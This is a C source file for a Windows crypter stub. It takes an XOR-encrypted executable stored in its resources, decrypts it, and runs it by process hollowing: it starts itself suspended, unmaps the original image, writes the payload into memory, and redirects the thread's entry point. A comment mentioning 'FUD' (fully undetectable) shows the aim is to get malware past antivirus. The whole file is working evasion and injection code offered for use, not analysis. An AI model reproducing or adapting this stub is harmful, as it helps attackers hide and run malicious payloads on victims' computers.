#include <stdio.h>
#include <windows.h>

typedef void (WINAPI *PTRZwUnmapViewOfSection)(
        IN HANDLE ProcessHandle, IN PVOID BaseAddress);

struct StubData{
    unsigned char * pFileBuffer;
    unsigned long FileSize;
    unsigned char * pKey;
    unsigned int KeySize;
    char FileName[MAX_PATH];
};

void LoadStruct(struct StubData * sData)
{
    HRSRC hRsrc;
    HGLOBAL hGlob;

    hRsrc = FindResource(NULL, MAKEINTRESOURCE(10), RT_RCDATA);
    if (hRsrc == NULL)exit(EXIT_FAILURE);

    sData->FileSize = SizeofResource(NULL, hRsrc);
    hGlob = LoadResource(NULL, hRsrc);
    if (hGlob == NULL)exit(EXIT_FAILURE);

    sData->pFileBuffer = (unsigned char*)LockResource(hGlob);
    if (sData->pFileBuffer == NULL)exit(EXIT_FAILURE);

    hRsrc = FindResource(NULL, MAKEINTRESOURCE(20), RT_RCDATA);
    if (hRsrc == NULL)exit(EXIT_FAILURE);

    sData->KeySize = SizeofResource(NULL, hRsrc);
    hGlob = LoadResource(NULL, hRsrc);
    if (hGlob == NULL)exit(EXIT_FAILURE);

    sData->pKey = (unsigned char*)LockResource(hGlob);
    if (sData->pKey == NULL)exit(EXIT_FAILURE);

    GetModuleFileName(NULL, sData->FileName, MAX_PATH);

}

/* Simple XOR Encryption (NOT FUD -- Learn to Develop your own) */
void Decrypt(struct StubData * sData)
{
    int i,j;

    j=0;
    i=0;

    for(i;i<sData->FileSize;i++)
    {
        *(sData->pFileBuffer+i) ^=*(sData->pKey+j);
        j++;

        if (j>=sData->KeySize)j=0;

    }

}


void runPE(struct StubData * sData)
{
    STARTUPINFO si;
	PROCESS_INFORMATION pi;
	CONTEXT ctx;

	PIMAGE_DOS_HEADER pidh;
    PIMAGE_NT_HEADERS pinh;
    PIMAGE_SECTION_HEADER pish;

	PTRZwUnmapViewOfSection pZwUnmapViewOfSection = NULL;
	int i;

	memset(&si, 0, sizeof(si));
	si.cb = sizeof(STARTUPINFO);
	ctx.ContextFlags = CONTEXT_FULL;

	pidh = (PIMAGE_DOS_HEADER)&sData->pFileBuffer[0];
	if(pidh->e_magic != IMAGE_DOS_SIGNATURE)
	{
		return;
	}
	pinh = (PIMAGE_NT_HEADERS)&sData->pFileBuffer[pidh->e_lfanew];
	if(pinh->Signature != IMAGE_NT_SIGNATURE)
	{
		return;
	}

	CreateProcess(NULL, sData->FileName, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    pZwUnmapViewOfSection = (PTRZwUnmapViewOfSection)GetProcAddress(GetModuleHandle("ntdll.dll"), "ZwUnmapViewOfSection");
    pZwUnmapViewOfSection(pi.hProcess, (void *)pinh->OptionalHeader.ImageBase);

	VirtualAllocEx(pi.hProcess, (void *)pinh->OptionalHeader.ImageBase, pinh->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	WriteProcessMemory(pi.hProcess, (void *)pinh->OptionalHeader.ImageBase, &sData->pFileBuffer[0], pinh->OptionalHeader.SizeOfHeaders, NULL);
	for(i = 0; i < pinh->FileHeader.NumberOfSections; i++)
	{
		pish = (PIMAGE_SECTION_HEADER)&sData->pFileBuffer[pidh->e_lfanew + sizeof(IMAGE_NT_HEADERS) + sizeof(IMAGE_SECTION_HEADER) * i];
		WriteProcessMemory(pi.hProcess, (void *)(pinh->OptionalHeader.ImageBase + pish->VirtualAddress), &sData->pFileBuffer[pish->PointerToRawData], pish->SizeOfRawData, NULL);
	}

	GetThreadContext(pi.hThread, &ctx);
	ctx.Eax = pinh->OptionalHeader.ImageBase + pinh->OptionalHeader.AddressOfEntryPoint;
	SetThreadContext(pi.hThread, &ctx);
	ResumeThread(pi.hThread);
}


int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    struct StubData sData;
    LoadStruct(&sData);
    Decrypt(&sData);
    runPE(&sData);
    return 0;
}
